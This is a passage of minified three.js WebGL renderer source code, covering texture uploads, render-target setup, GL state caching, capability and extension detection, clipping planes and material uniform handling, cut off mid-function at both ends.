c.texImage2D(a.TEXTURE_2D,0,l,p.width,p.height,0,l,G,p.data);else if(b.isCompressedTexture)for(H=\n0,aa=r.length;H<aa;H++)p=r[H],1023!==b.format&&1022!==b.format?-1<c.getCompressedTextureFormats().indexOf(l)?c.compressedTexImage2D(a.TEXTURE_2D,H,l,p.width,p.height,0,p.data):console.warn(\"THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()\"):c.texImage2D(a.TEXTURE_2D,H,l,p.width,p.height,0,l,G,p.data);else if(0<r.length&&n){H=0;for(aa=r.length;H<aa;H++)p=r[H],c.texImage2D(a.TEXTURE_2D,H,l,l,G,p);b.generateMipmaps=!1}else c.texImage2D(a.TEXTURE_2D,0,l,l,\nG,p);b.generateMipmaps&&n&&a.generateMipmap(a.TEXTURE_2D);k.__version=b.version;if(b.onUpdate)b.onUpdate(b);return}}c.activeTexture(a.TEXTURE0+g);c.bindTexture(a.TEXTURE_2D,k.__webglTexture)}function u(c,g,h){h?(a.texParameteri(c,a.TEXTURE_WRAP_S,f(g.wrapS)),a.texParameteri(c,a.TEXTURE_WRAP_T,f(g.wrapT)),a.texParameteri(c,a.TEXTURE_MAG_FILTER,f(g.magFilter)),a.texParameteri(c,a.TEXTURE_MIN_FILTER,f(g.minFilter))):(a.texParameteri(c,a.TEXTURE_WRAP_S,a.CLAMP_TO_EDGE),a.texParameteri(c,a.TEXTURE_WRAP_T,\na.CLAMP_TO_EDGE),1001===g.wrapS&&1001===g.wrapT||console.warn(\"THREE.WebGLRenderer: Texture is not power of two. Texture.wrapS and Texture.wrapT should be set to THREE.ClampToEdgeWrapping.\",g),a.texParameteri(c,a.TEXTURE_MAG_FILTER,k(g.magFilter)),a.texParameteri(c,a.TEXTURE_MIN_FILTER,k(g.minFilter)),1003!==g.minFilter&&1006!==g.minFilter&&console.warn(\"THREE.WebGLRenderer: Texture is not power of two. Texture.minFilter should be set to THREE.NearestFilter or THREE.LinearFilter.\",g));!(h=b.get(\"EXT_texture_filter_anisotropic\"))||\n1015===g.type&&null===b.get(\"OES_texture_float_linear\")||1016===g.type&&null===b.get(\"OES_texture_half_float_linear\")||!(1<g.anisotropy||d.get(g).__currentAnisotropy)||(a.texParameterf(c,h.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(g.anisotropy,e.getMaxAnisotropy())),d.get(g).__currentAnisotropy=g.anisotropy)}function l(b,e,g,h){var m=f(e.texture.format),k=f(e.texture.type);c.texImage2D(h,0,m,e.width,e.height,0,m,k,null);a.bindFramebuffer(a.FRAMEBUFFER,b);a.framebufferTexture2D(a.FRAMEBUFFER,g,h,d.get(e.texture).__webglTexture,\n0);a.bindFramebuffer(a.FRAMEBUFFER,null)}function r(b,c){a.bindRenderbuffer(a.RENDERBUFFER,b);c.depthBuffer&&!c.stencilBuffer?(a.renderbufferStorage(a.RENDERBUFFER,a.DEPTH_COMPONENT16,c.width,c.height),a.framebufferRenderbuffer(a.FRAMEBUFFER,a.DEPTH_ATTACHMENT,a.RENDERBUFFER,b)):c.depthBuffer&&c.stencilBuffer?(a.renderbufferStorage(a.RENDERBUFFER,a.DEPTH_STENCIL,c.width,c.height),a.framebufferRenderbuffer(a.FRAMEBUFFER,a.DEPTH_STENCIL_ATTACHMENT,a.RENDERBUFFER,b)):a.renderbufferStorage(a.RENDERBUFFER,\na.RGBA4,c.width,c.height);a.bindRenderbuffer(a.RENDERBUFFER,null)}var q=g.memory,w=\"undefined\"!==typeof WebGL2RenderingContext&&a instanceof WebGL2RenderingContext;this.setTexture2D=n;this.setTextureCube=function(b,g){var k=d.get(b);if(6===b.image.length)if(0<b.version&&k.__version!==b.version){k.__image__webglTextureCube||(b.addEventListener(\"dispose\",t),k.__image__webglTextureCube=a.createTexture(),q.textures++);c.activeTexture(a.TEXTURE0+g);c.bindTexture(a.TEXTURE_CUBE_MAP,k.__image__webglTextureCube);\na.pixelStorei(a.UNPACK_FLIP_Y_WEBGL,b.flipY);for(var n=b&&b.isCompressedTexture,p=b.image[0]&&b.image[0].isDataTexture,l=[],r=0;6>r;r++)l[r]=n||p?p?b.image[r].image:b.image[r]:h(b.image[r],e.maxCubemapSize);var G=m(l[0]),w=f(b.format),aa=f(b.type);u(a.TEXTURE_CUBE_MAP,b,G);for(r=0;6>r;r++)if(n)for(var x,D=l[r].mipmaps,z=0,Q=D.length;z<Q;z++)x=D[z],1023!==b.format&&1022!==b.format?-1<c.getCompressedTextureFormats().indexOf(w)?c.compressedTexImage2D(a.TEXTURE_CUBE_MAP_POSITIVE_X+r,z,w,x.width,x.height,\n0,x.data):console.warn(\"THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .setTextureCube()\"):c.texImage2D(a.TEXTURE_CUBE_MAP_POSITIVE_X+r,z,w,x.width,x.height,0,w,aa,x.data);else p?c.texImage2D(a.TEXTURE_CUBE_MAP_POSITIVE_X+r,0,w,l[r].width,l[r].height,0,w,aa,l[r].data):c.texImage2D(a.TEXTURE_CUBE_MAP_POSITIVE_X+r,0,w,w,aa,l[r]);b.generateMipmaps&&G&&a.generateMipmap(a.TEXTURE_CUBE_MAP);k.__version=b.version;if(b.onUpdate)b.onUpdate(b)}else c.activeTexture(a.TEXTURE0+\ng),c.bindTexture(a.TEXTURE_CUBE_MAP,k.__image__webglTextureCube)};this.setTextureCubeDynamic=function(b,e){c.activeTexture(a.TEXTURE0+e);c.bindTexture(a.TEXTURE_CUBE_MAP,d.get(b).__webglTexture)};this.setupRenderTarget=function(b){var e=d.get(b),f=d.get(b.texture);b.addEventListener(\"dispose\",p);f.__webglTexture=a.createTexture();q.textures++;var g=!0===b.isWebGLRenderTargetCube,h=m(b);if(g){e.__webglFramebuffer=[];for(var k=0;6>k;k++)e.__webglFramebuffer[k]=a.createFramebuffer()}else e.__webglFramebuffer=\na.createFramebuffer();if(g){c.bindTexture(a.TEXTURE_CUBE_MAP,f.__webglTexture);u(a.TEXTURE_CUBE_MAP,b.texture,h);for(k=0;6>k;k++)l(e.__webglFramebuffer[k],b,a.COLOR_ATTACHMENT0,a.TEXTURE_CUBE_MAP_POSITIVE_X+k);b.texture.generateMipmaps&&h&&a.generateMipmap(a.TEXTURE_CUBE_MAP);c.bindTexture(a.TEXTURE_CUBE_MAP,null)}else c.bindTexture(a.TEXTURE_2D,f.__webglTexture),u(a.TEXTURE_2D,b.texture,h),l(e.__webglFramebuffer,b,a.COLOR_ATTACHMENT0,a.TEXTURE_2D),b.texture.generateMipmaps&&h&&a.generateMipmap(a.TEXTURE_2D),\nc.bindTexture(a.TEXTURE_2D,null);if(b.depthBuffer){e=d.get(b);f=!0===b.isWebGLRenderTargetCube;if(b.depthTexture){if(f)throw Error(\"target.depthTexture not supported in Cube render targets\");if(b&&b.isWebGLRenderTargetCube)throw Error(\"Depth Texture with cube render targets is not supported!\");a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer);if(!b.depthTexture||!b.depthTexture.isDepthTexture)throw Error(\"renderTarget.depthTexture must be an instance of THREE.DepthTexture\");d.get(b.depthTexture).__webglTexture&&\nb.depthTexture.image.width===b.width&&b.depthTexture.image.height===b.height||(b.depthTexture.image.width=b.width,b.depthTexture.image.height=b.height,b.depthTexture.needsUpdate=!0);n(b.depthTexture,0);e=d.get(b.depthTexture).__webglTexture;if(1026===b.depthTexture.format)a.framebufferTexture2D(a.FRAMEBUFFER,a.DEPTH_ATTACHMENT,a.TEXTURE_2D,e,0);else if(1027===b.depthTexture.format)a.framebufferTexture2D(a.FRAMEBUFFER,a.DEPTH_STENCIL_ATTACHMENT,a.TEXTURE_2D,e,0);else throw Error(\"Unknown depthTexture format\");\n}else if(f)for(e.__webglDepthbuffer=[],f=0;6>f;f++)a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer[f]),e.__webglDepthbuffer[f]=a.createRenderbuffer(),r(e.__webglDepthbuffer[f],b);else a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer),e.__webglDepthbuffer=a.createRenderbuffer(),r(e.__webglDepthbuffer,b);a.bindFramebuffer(a.FRAMEBUFFER,null)}};this.updateRenderTargetMipmap=function(b){var e=b.texture;e.generateMipmaps&&m(b)&&1003!==e.minFilter&&1006!==e.minFilter&&(b=b&&b.isWebGLRenderTargetCube?\na.TEXTURE_CUBE_MAP:a.TEXTURE_2D,e=d.get(e).__webglTexture,c.bindTexture(b,e),a.generateMipmap(b),c.bindTexture(b,null))}}function Qf(){var a={};return{get:function(b){b=b.uuid;var c=a[b];void 0===c&&(c={},a[b]=c);return c},\"delete\":function(b){delete a[b.uuid]},clear:function(){a={}}}}function Rf(a,b,c){function d(b,c,d){var e=new Uint8Array(4),f=a.createTexture();a.bindTexture(b,f);a.texParameteri(b,a.TEXTURE_MIN_FILTER,a.NEAREST);a.texParameteri(b,a.TEXTURE_MAG_FILTER,a.NEAREST);for(b=0;b<d;b++)a.texImage2D(c+\nb,0,a.RGBA,1,1,0,a.RGBA,a.UNSIGNED_BYTE,e);return f}function e(b){!0!==y[b]&&(a.enable(b),y[b]=!0)}function f(b){!1!==y[b]&&(a.disable(b),y[b]=!1)}function g(b,d,g,h,m,k,n,t){0!==b?e(a.BLEND):f(a.BLEND);if(b!==v||t!==x)2===b?t?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ONE,a.ONE,a.ONE,a.ONE)):(a.blendEquation(a.FUNC_ADD),a.blendFunc(a.SRC_ALPHA,a.ONE)):3===b?t?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ZERO,a.ZERO,a.ONE_MINUS_SRC_COLOR,a.ONE_MINUS_SRC_ALPHA)):\n(a.blendEquation(a.FUNC_ADD),a.blendFunc(a.ZERO,a.ONE_MINUS_SRC_COLOR)):4===b?t?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ZERO,a.SRC_COLOR,a.ZERO,a.SRC_ALPHA)):(a.blendEquation(a.FUNC_ADD),a.blendFunc(a.ZERO,a.SRC_COLOR)):t?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ONE,a.ONE_MINUS_SRC_ALPHA,a.ONE,a.ONE_MINUS_SRC_ALPHA)):(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.SRC_ALPHA,a.ONE_MINUS_SRC_ALPHA,a.ONE,a.ONE_MINUS_SRC_ALPHA)),\nv=b,x=t;if(5===b){m=m||d;k=k||g;n=n||h;if(d!==E||m!==F)a.blendEquationSeparate(c(d),c(m)),E=d,F=m;if(g!==L||h!==C||k!==da||n!==H)a.blendFuncSeparate(c(g),c(h),c(k),c(n)),L=g,C=h,da=k,H=n}else H=da=F=C=L=E=null}function h(a){n.setFunc(a)}function m(b){D!==b&&(b?a.frontFace(a.CW):a.frontFace(a.CCW),D=b)}function k(b){0!==b?(e(a.CULL_FACE),b!==z&&(1===b?a.cullFace(a.BACK):2===b?a.cullFace(a.FRONT):a.cullFace(a.FRONT_AND_BACK))):f(a.CULL_FACE);z=b}function t(b){void 0===b&&(b=a.TEXTURE0+P-1);W!==b&&(a.activeTexture(b),\nW=b)}var p=new function(){var b=!1,c=new fa,d=null,e=new fa;return{setMask:function(c){d===c||b||(a.colorMask(c,c,c,c),d=c)},setLocked:function(a){b=a},setClear:function(b,d,f,g,h){!0===h&&(b*=g,d*=g,f*=g);c.set(b,d,f,g);!1===e.equals(c)&&(a.clearColor(b,d,f,g),e.copy(c))},reset:function(){b=!1;d=null;e.set(0,0,0,1)}}},n=new function(){var b=!1,c=null,d=null,g=null;return{setTest:function(b){b?e(a.DEPTH_TEST):f(a.DEPTH_TEST)},setMask:function(d){c===d||b||(a.depthMask(d),c=d)},setFunc:function(b){if(d!==\nb){if(b)switch(b){case 0:a.depthFunc(a.NEVER);break;case 1:a.depthFunc(a.ALWAYS);break;case 2:a.depthFunc(a.LESS);break;case 3:a.depthFunc(a.LEQUAL);break;case 4:a.depthFunc(a.EQUAL);break;case 5:a.depthFunc(a.GEQUAL);break;case 6:a.depthFunc(a.GREATER);break;case 7:a.depthFunc(a.NOTEQUAL);break;default:a.depthFunc(a.LEQUAL)}else a.depthFunc(a.LEQUAL);d=b}},setLocked:function(a){b=a},setClear:function(b){g!==b&&(a.clearDepth(b),g=b)},reset:function(){b=!1;g=d=c=null}}},u=new function(){var b=!1,c=\nnull,d=null,g=null,h=null,m=null,k=null,n=null,t=null;return{setTest:function(b){b?e(a.STENCIL_TEST):f(a.STENCIL_TEST)},setMask:function(d){c===d||b||(a.stencilMask(d),c=d)},setFunc:function(b,c,e){if(d!==b||g!==c||h!==e)a.stencilFunc(b,c,e),d=b,g=c,h=e},setOp:function(b,c,d){if(m!==b||k!==c||n!==d)a.stencilOp(b,c,d),m=b,k=c,n=d},setLocked:function(a){b=a},setClear:function(b){t!==b&&(a.clearStencil(b),t=b)},reset:function(){b=!1;t=n=k=m=h=g=d=c=null}}},l=a.getParameter(a.MAX_VERTEX_ATTRIBS),r=new Uint8Array(l),\nq=new Uint8Array(l),w=new Uint8Array(l),y={},K=null,v=null,E=null,L=null,C=null,F=null,da=null,H=null,x=!1,D=null,z=null,J=null,Q=null,M=null,O=null,P=a.getParameter(a.MAX_TEXTURE_IMAGE_UNITS),l=parseFloat(/^WebGL\\ ([0-9])/.exec(a.getParameter(a.VERSION))[1]),I=1<=parseFloat(l),W=null,S={},R=new fa,T=new fa,N={};N[a.TEXTURE_2D]=d(a.TEXTURE_2D,a.TEXTURE_2D,1);N[a.TEXTURE_CUBE_MAP]=d(a.TEXTURE_CUBE_MAP,a.TEXTURE_CUBE_MAP_POSITIVE_X,6);return{buffers:{color:p,depth:n,stencil:u},init:function(){p.setClear(0,\n0,0,1);n.setClear(1);u.setClear(0);e(a.DEPTH_TEST);h(3);m(!1);k(1);e(a.CULL_FACE);e(a.BLEND);g(1)},initAttributes:function(){for(var a=0,b=r.length;a<b;a++)r[a]=0},enableAttribute:function(c){r[c]=1;0===q[c]&&(a.enableVertexAttribArray(c),q[c]=1);0!==w[c]&&(b.get(\"ANGLE_instanced_arrays\").vertexAttribDivisorANGLE(c,0),w[c]=0)},enableAttributeAndDivisor:function(b,c,d){r[b]=1;0===q[b]&&(a.enableVertexAttribArray(b),q[b]=1);w[b]!==c&&(d.vertexAttribDivisorANGLE(b,c),w[b]=c)},disableUnusedAttributes:function(){for(var b=\n0,c=q.length;b!==c;++b)q[b]!==r[b]&&(a.disableVertexAttribArray(b),q[b]=0)},enable:e,disable:f,getCompressedTextureFormats:function(){if(null===K&&(K=[],b.get(\"WEBGL_compressed_texture_pvrtc\")||b.get(\"WEBGL_compressed_texture_s3tc\")||b.get(\"WEBGL_compressed_texture_etc1\")))for(var c=a.getParameter(a.COMPRESSED_TEXTURE_FORMATS),d=0;d<c.length;d++)K.push(c[d]);return K},setBlending:g,setColorWrite:function(a){p.setMask(a)},setDepthTest:function(a){n.setTest(a)},setDepthWrite:function(a){n.setMask(a)},\nsetDepthFunc:h,setStencilTest:function(a){u.setTest(a)},setStencilWrite:function(a){u.setMask(a)},setStencilFunc:function(a,b,c){u.setFunc(a,b,c)},setStencilOp:function(a,b,c){u.setOp(a,b,c)},setFlipSided:m,setCullFace:k,setLineWidth:function(b){b!==J&&(I&&a.lineWidth(b),J=b)},setPolygonOffset:function(b,c,d){if(b){if(e(a.POLYGON_OFFSET_FILL),Q!==c||M!==d)a.polygonOffset(c,d),Q=c,M=d}else f(a.POLYGON_OFFSET_FILL)},getScissorTest:function(){return O},setScissorTest:function(b){(O=b)?e(a.SCISSOR_TEST):\nf(a.SCISSOR_TEST)},activeTexture:t,bindTexture:function(b,c){null===W&&t();var d=S[W];void 0===d&&(d={type:void 0,texture:void 0},S[W]=d);if(d.type!==b||d.texture!==c)a.bindTexture(b,c||N[b]),d.type=b,d.texture=c},compressedTexImage2D:function(){try{a.compressedTexImage2D.apply(a,arguments)}catch(b){console.error(b)}},texImage2D:function(){try{a.texImage2D.apply(a,arguments)}catch(b){console.error(b)}},scissor:function(b){!1===R.equals(b)&&(a.scissor(b.x,b.y,b.z,b.w),R.copy(b))},viewport:function(b){!1===\nT.equals(b)&&(a.viewport(b.x,b.y,b.z,b.w),T.copy(b))},reset:function(){for(var b=0;b<q.length;b++)1===q[b]&&(a.disableVertexAttribArray(b),q[b]=0);y={};W=K=null;S={};z=D=v=null;p.reset();n.reset();u.reset()}}}function Sf(a,b,c){function d(b){if(\"highp\"===b){if(0<a.getShaderPrecisionFormat(a.VERTEX_SHADER,a.HIGH_FLOAT).precision&&0<a.getShaderPrecisionFormat(a.FRAGMENT_SHADER,a.HIGH_FLOAT).precision)return\"highp\";b=\"mediump\"}return\"mediump\"===b&&0<a.getShaderPrecisionFormat(a.VERTEX_SHADER,a.MEDIUM_FLOAT).precision&&\n0<a.getShaderPrecisionFormat(a.FRAGMENT_SHADER,a.MEDIUM_FLOAT).precision?\"mediump\":\"lowp\"}var e,f=void 0!==c.precision?c.precision:\"highp\",g=d(f);g!==f&&(console.warn(\"THREE.WebGLRenderer:\",f,\"not supported, using\",g,\"instead.\"),f=g);c=!0===c.logarithmicDepthBuffer&&!!b.get(\"EXT_frag_depth\");var g=a.getParameter(a.MAX_TEXTURE_IMAGE_UNITS),h=a.getParameter(a.MAX_VERTEX_TEXTURE_IMAGE_UNITS),m=a.getParameter(a.MAX_TEXTURE_SIZE),k=a.getParameter(a.MAX_CUBE_MAP_TEXTURE_SIZE),t=a.getParameter(a.MAX_VERTEX_ATTRIBS),\np=a.getParameter(a.MAX_VERTEX_UNIFORM_VECTORS),n=a.getParameter(a.MAX_VARYING_VECTORS),u=a.getParameter(a.MAX_FRAGMENT_UNIFORM_VECTORS),l=0<h,r=!!b.get(\"OES_texture_float\");return{getMaxAnisotropy:function(){if(void 0!==e)return e;var c=b.get(\"EXT_texture_filter_anisotropic\");return e=null!==c?a.getParameter(c.MAX_TEXTURE_MAX_ANISOTROPY_EXT):0},getMaxPrecision:d,precision:f,logarithmicDepthBuffer:c,maxTextures:g,maxVertexTextures:h,maxTextureSize:m,maxCubemapSize:k,maxAttributes:t,maxVertexUniforms:p,\nmaxVaryings:n,maxFragmentUniforms:u,vertexTextures:l,floatFragmentTextures:r,floatVertexTextures:l&&r}}function Tf(a){var b={};return{get:function(c){if(void 0!==b[c])return b[c];var d;switch(c){case \"WEBGL_depth_texture\":d=a.getExtension(\"WEBGL_depth_texture\")||a.getExtension(\"MOZ_WEBGL_depth_texture\")||a.getExtension(\"WEBKIT_WEBGL_depth_texture\");break;case \"EXT_texture_filter_anisotropic\":d=a.getExtension(\"EXT_texture_filter_anisotropic\")||a.getExtension(\"MOZ_EXT_texture_filter_anisotropic\")||\na.getExtension(\"WEBKIT_EXT_texture_filter_anisotropic\");break;case \"WEBGL_compressed_texture_s3tc\":d=a.getExtension(\"WEBGL_compressed_texture_s3tc\")||a.getExtension(\"MOZ_WEBGL_compressed_texture_s3tc\")||a.getExtension(\"WEBKIT_WEBGL_compressed_texture_s3tc\");break;case \"WEBGL_compressed_texture_pvrtc\":d=a.getExtension(\"WEBGL_compressed_texture_pvrtc\")||a.getExtension(\"WEBKIT_WEBGL_compressed_texture_pvrtc\");break;case \"WEBGL_compressed_texture_etc1\":d=a.getExtension(\"WEBGL_compressed_texture_etc1\");\nbreak;default:d=a.getExtension(c)}null===d&&console.warn(\"THREE.WebGLRenderer: \"+c+\" extension not supported.\");return b[c]=d}}}function Uf(){function a(){k.value!==d&&(k.value=d,k.needsUpdate=0<e);c.numPlanes=e;c.numIntersection=0}function b(a,b,d,e){var f=null!==a?a.length:0,g=null;if(0!==f){g=k.value;if(!0!==e||null===g){e=d+4*f;b=b.matrixWorldInverse;m.getNormalMatrix(b);if(null===g||g.length<e)g=new Float32Array(e);for(e=0;e!==f;++e,d+=4)h.copy(a[e]).applyMatrix4(b,m),h.normal.toArray(g,d),g[d+\n3]=h.constant}k.value=g;k.needsUpdate=!0}c.numPlanes=f;return g}var c=this,d=null,e=0,f=!1,g=!1,h=new la,m=new ya,k={value:null,needsUpdate:!1};this.uniform=k;this.numIntersection=this.numPlanes=0;this.init=function(a,c,g){var h=0!==a.length||c||0!==e||f;f=c;d=b(a,g,0);e=a.length;return h};this.beginShadows=function(){g=!0;b(null)};this.endShadows=function(){g=!1;a()};this.setState=function(c,h,m,l,G,r){if(!f||null===c||0===c.length||g&&!m)g?b(null):a();else{m=g?0:e;var q=4*m,w=G.clippingState||null;\nk.value=w;w=b(c,l,q,r);for(c=0;c!==q;++c)w[c]=d[c];G.clippingState=w;this.numIntersection=h?this.numPlanes:0;this.numPlanes+=m}}}function Yd(a){function b(){Y.init();Y.scissor(X.copy(ga).multiplyScalar(Ra));Y.viewport(Z.copy(ia).multiplyScalar(Ra));Y.buffers.color.setClear(Ea.r,Ea.g,Ea.b,gb,F)}function c(){U=wa=null;V=\"\";R=-1;Y.reset()}function d(a){a.preventDefault();c();b();ha.clear()}function e(a){a=a.target;a.removeEventListener(\"dispose\",e);f(a);ha[\"delete\"](a)}function f(a){var b=ha.get(a).program;\na.program=void 0;void 0!==b&&ya.releaseProgram(b)}function g(a,b){return Math.abs(b[0])-Math.abs(a[0])}function h(a,b){return a.object.renderOrder!==b.object.renderOrder?a.object.renderOrder-b.object.renderOrder:a.material.program&&b.material.program&&a.material.program!==b.material.program?a.material.program.id-b.material.program.id:a.material.id!==b.material.id?a.material.id-b.material.id:a.z!==b.z?a.z-b.z:a.id-b.id}function m(a,b){return a.object.renderOrder!==b.object.renderOrder?a.object.renderOrder-\nb.object.renderOrder:a.z!==b.z?b.z-a.z:a.id-b.id}function k(a,b,c,d,e){var f;c.transparent?(d=z,f=++T):(d=aa,f=++D);f=d[f];void 0!==f?(f.id=a.id,f.object=a,f.geometry=b,f.material=c,f.z=Ga.z,f.group=e):(f={id:a.id,object:a,geometry:b,material:c,z:Ga.z,group:e},d.push(f))}function t(a){if(!ma.intersectsSphere(a))return!1;var b=ca.numPlanes;if(0===b)return!0;var c=P.clippingPlanes,d=a.center;a=-a.radius;var e=0;do if(c[e].distanceToPoint(d)<a)return!1;while(++e!==b);return!0}function p(a,b){if(!1!==\na.visible){if(0!==(a.layers.mask&b.layers.mask))if(a.isLight)H.push(a);else if(a.isSprite){var c;(c=!1===a.frustumCulled)||(na.center.set(0,0,0),na.radius=.7071067811865476,na.applyMatrix4(a.matrixWorld),c=!0===t(na));c&&M.push(a)}else if(a.isLensFlare)O.push(a);else if(a.isImmediateRenderObject)!0===P.sortObjects&&(Ga.setFromMatrixPosition(a.matrixWorld),Ga.applyMatrix4(ua)),k(a,null,a.material,Ga.z,null);else if(a.isMesh||a.isLine||a.isPoints)if(a.isSkinnedMesh&&a.skeleton.update(),(c=!1===a.frustumCulled)||\n(c=a.geometry,null===c.boundingSphere&&c.computeBoundingSphere(),na.copy(c.boundingSphere).applyMatrix4(a.matrixWorld),c=!0===t(na)),c){var d=a.material;if(!0===d.visible)if(!0===P.sortObjects&&(Ga.setFromMatrixPosition(a.matrixWorld),Ga.applyMatrix4(ua)),c=qa.update(a),d.isMultiMaterial)for(var e=c.groups,f=d.materials,d=0,g=e.length;d<g;d++){var h=e[d],m=f[h.materialIndex];!0===m.visible&&k(a,c,m,Ga.z,h)}else k(a,c,d,Ga.z,null)}c=a.children;d=0;for(g=c.length;d<g;d++)p(c[d],b)}}function n(a,b,c,\nd){for(var e=0,f=a.length;e<f;e++){var g=a[e],h=g.object,m=g.geometry,k=void 0===d?g.material:d,g=g.group;h.modelViewMatrix.multiplyMatrices(c.matrixWorldInverse,h.matrixWorld);h.normalMatrix.getNormalMatrix(h.modelViewMatrix);h.onBeforeRender(P,b,c,m,k,g);if(h.isImmediateRenderObject){l(k);var n=G(c,b.fog,k,h);V=\"\";h.render(function(a){P.renderBufferImmediate(a,n,k)})}else P.renderBufferDirect(c,b.fog,m,k,h,g);h.onAfterRender(P,b,c,m,k,g)}}function l(a){2===a.side?Y.disable(B.CULL_FACE):Y.enable(B.CULL_FACE);\nY.setFlipSided(1===a.side);!0===a.transparent?Y.setBlending(a.blending,a.blendEquation,a.blendSrc,a.blendDst,a.blendEquationAlpha,a.blendSrcAlpha,a.blendDstAlpha,a.premultipliedAlpha):Y.setBlending(0);Y.setDepthFunc(a.depthFunc);Y.setDepthTest(a.depthTest);Y.setDepthWrite(a.depthWrite);Y.setColorWrite(a.colorWrite);Y.setPolygonOffset(a.polygonOffset,a.polygonOffsetFactor,a.polygonOffsetUnits)}function G(a,b,c,d){ea=0;var g=ha.get(c);oa&&(ra||a!==U)&&ca.setState(c.clippingPlanes,c.clipIntersection,\nc.clipShadows,a,g,a===U&&c.id===R);!1===c.needsUpdate&&(void 0===g.program?c.needsUpdate=!0:c.fog&&g.fog!==b?c.needsUpdate=!0:c.lights&&g.lightsHash!==ba.hash?c.needsUpdate=!0:void 0===g.numClippingPlanes||g.numClippingPlanes===ca.numPlanes&&g.numIntersection===ca.numIntersection||(c.needsUpdate=!0));if(c.needsUpdate){a:{var h=ha.get(c),m=ya.getParameters(c,ba,b,ca.numPlanes,ca.numIntersection,d),k=ya.getProgramCode(c,m),n=h.program,t=!0;if(void 0===n)c.addEventListener(\"dispose\",e);else if(n.code!==\nk)f(c);else if(void 0!==m.shaderID)break a;else t=!1;t&&(m.shaderID?(n=bb[m.shaderID],h.__webglShader={name:c.type,uniforms:Ja.clone(n.uniforms),vertexShader:n.vertexShader,fragmentShader:n.fragmentShader}):h.__webglShader={name:c.type,uniforms:c.uniforms,vertexShader:c.vertexShader,fragmentShader:c.fragmentShader},c.__webglShader=h.__webglShader,n=ya.acquireProgram(c,m,k),h.program=n,c.program=n);m=n.getAttributes();if(c.morphTargets)for(k=c.numSupportedMorphTargets=0;k<P.maxMorphTargets;k++)0<=\nm[\"morphTarget\"+k]&&c.numSupportedMorphTargets++;if(c.morphNormals)for(k=c.numSupportedMorphNormals=0;k<P.maxMorphNormals;k++)0<=m[\"morphNormal\"+k]&&c.numSupportedMorphNormals++;m=h.__webglShader.uniforms;if(!c.isShaderMaterial&&!c.isRawShaderMaterial||!0===c.clipping)h.numClippingPlanes=ca.numPlanes,h.numIntersection=ca.numIntersection,m.clippingPlanes=ca.uniform;h.fog=b;h.lightsHash=ba.hash;c.lights&&(m.ambientLightColor.value=ba.ambient,m.directionalLights.value=ba.directional,m.spotLights.value=\nba.spot,m.rectAreaLights.value=ba.rectArea,m.pointLights.value=ba.point,m.hemisphereLights.value=ba.hemi,m.directionalShadowMap.value=ba.directionalShadowMap,m.directionalShadowMatrix.value=ba.directionalShadowMatrix,m.spotShadowMap.value=ba.spotShadowMap,m.spotShadowMatrix.value=ba.spotShadowMatrix,m.pointShadowMap.value=ba.pointShadowMap,m.pointShadowMatrix.value=ba.pointShadowMatrix);k=h.program.getUniforms();m=$a.seqWithValue(k.seq,m);h.uniformsList=m}c.needsUpdate=!1}var p=!1,t=n=!1,h=g.program,\nm=h.getUniforms(),k=g.__webglShader.uniforms;h.id!==wa&&(B.useProgram(h.program),wa=h.id,t=n=p=!0);c.id!==R&&(R=c.id,n=!0);if(p||a!==U){m.set(B,a,\"projectionMatrix\");la.logarithmicDepthBuffer&&m.setValue(B,\"logDepthBufFC\",2/(Math.log(a.far+1)/Math.LN2));a!==U&&(U=a,t=n=!0);if(c.isShaderMaterial||c.isMeshPhongMaterial||c.isMeshStandardMaterial||c.envMap)p=m.map.cameraPosition,void 0!==p&&p.setValue(B,Ga.setFromMatrixPosition(a.matrixWorld));(c.isMeshPhongMaterial||c.isMeshLambertMaterial||c.isMeshBasicMaterial||\nc.isMeshStandardMaterial||c.isShaderMaterial||c.skinning)&&m.setValue(B,\"viewMatrix\",a.matrixWorldInverse);m.set(B,P,\"toneMappingExposure\");m.set(B,P,\"toneMappingWhitePoint\")}c.skinning&&(m.setOptional(B,d,\"bindMatrix\"),m.setOptional(B,d,\"bindMatrixInverse\"),a=d.skeleton)&&(la.floatVertexTextures&&a.useVertexTexture?(m.set(B,a,\"boneTexture\"),m.set(B,a,\"boneTextureWidth\"),m.set(B,a,\"boneTextureHeight\")):m.setOptional(B,a,\"boneMatrices\"));if(n){c.lights&&(a=t,k.ambientLightColor.needsUpdate=a,k.directionalLights.needsUpdate=\na,k.pointLights.needsUpdate=a,k.spotLights.needsUpdate=a,k.rectAreaLights.needsUpdate=a,k.hemisphereLights.needsUpdate=a);b&&c.fog&&(k.fogColor.value=b.color,b.isFog?(k.fogNear.value=b.near,k.fogFar.value=b.far):b.isFogExp2&&(k.fogDensity.value=b.density));if(c.isMeshBasicMaterial||c.isMeshLambertMaterial||c.isMeshPhongMaterial||c.isMeshStandardMaterial||c.isMeshNormalMaterial||c.isMeshDepthMaterial){k.opacity.value=c.opacity;k.diffuse.value=c.color;c.emissive&&k.emissive.value.copy(c.emissive).multiplyScalar(c.emissiveIntensity);\nk.map.value=c.map;k.specularMap.value=c.specularMap;k.alphaMap.value=c.alphaMap;c.lightMap&&(k.lightMap.value=c.lightMap,k.lightMapIntensity.value=c.lightMapIntensity);c.aoMap&&(k.aoMap.value=c.aoMap,k.aoMapIntensity.value=c.aoMapIntensity);var l;c.map?l=c.map:c.specularMap?l=c.specularMap:c.displacementMap?l=c.displacementMap:c.normalMap?l=c.normalMap:c.bumpMap?l=c.bumpMap:c.roughnessMap?l=c.roughnessMap:c.metalnessMap?l=c.metalnessMap:c.alphaMap?l=c.alphaMap:c.emissiveMap&&(l=c.emissiveMap);void 